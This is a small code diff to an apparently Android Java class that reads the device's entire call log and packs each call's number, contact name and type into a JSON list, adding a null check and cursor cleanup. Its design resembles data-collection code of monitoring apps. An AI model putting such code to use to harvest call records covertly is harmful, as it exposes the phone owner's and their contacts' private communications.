@@ -23,7 +23,13 @@ public class CallsManager {
             Uri allCalls = Uri.parse("content://call_log/calls");
             Cursor cur = MainService.getContextOfApplication().getContentResolver().query(allCalls, null, null, null, null);
 
-            while (cur.moveToNext()) {
+            if (cur == null) {
+                Calls.put("callsList", list);
+                return Calls;
+            }
+
+            try {
+                while (cur.moveToNext()) {
                 JSONObject call = new JSONObject();
                 String num = cur.getString(cur.getColumnIndex(CallLog.Calls.NUMBER));// for  number
                 String name = cur.getString(cur.getColumnIndex(CallLog.Calls.CACHED_NAME));// for name
@@ -37,6 +43,11 @@ public class CallsManager {
                 call.put("type", type);
                 list.put(call);
 
+                }
+            } finally {
+                if (cur != null) {
+                    cur.close();
+                }
             }
             Calls.put("callsList", list);
             return Calls;
